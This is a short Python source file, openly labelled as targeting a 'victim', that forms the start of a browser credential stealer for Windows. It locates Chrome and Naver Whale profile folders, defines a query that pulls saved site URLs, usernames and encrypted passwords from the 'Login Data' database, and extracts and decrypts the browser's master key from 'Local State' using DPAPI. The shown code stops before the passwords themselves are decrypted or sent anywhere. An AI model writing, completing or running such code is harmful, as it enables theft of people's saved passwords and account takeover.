import os
import base64
import json
from win32crypt import CryptUnprotectData
from typing import List

# Define the victim environment, and the path to the file to be stolen
class victimEnvironment:
    def __init__(self):
        self.appdataLocalPath = os.getenv('LOCALAPPDATA')
        self.browserPath = {
            "chrome": f"{self.appdataLocalPath}\\Google\\Chrome\\User Data",
            "whale":  f"{self.appdataLocalPath}\\Naver\\Naver Whale\\User Data",
        }
        self.browserInformationFilePath = {
            "loginData": {
                "query": "SELECT action_url, username_value, password_value FROM logins",
                "subPath": "\\Login Data"
            }
        }

    # Check if the browser is installed
    def checkBrowserInstallation(self) -> List[str]:
        for browser in self.browserPath:
            if os.path.exists(self.browserPath[browser]):
                print(f"[+] {browser} installed")
            else:
                print(f"[+] {browser} not installed")

    # Get master key from the victim's environment
    def getMasterKey(self, browserPath: str):
        if not os.path.exists(browserPath):
            raise Exception(f"[!] {browserPath} does not exist")
        
        localStatePath = f"{browserPath}\\Local State"
        if "os_crypt" not in open(localStatePath, "r", encoding = "utf-8").read():
            raise Exception(f"[!] os_crypt not found in {localStatePath}")

        with open(localStatePath, "r", encoding = "utf-8") as localStateStream:
            c = localStateStream.read()
            localState = json.loads(c)
            masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
            masterKey = masterKey[5:]
            masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]
            return masterKey

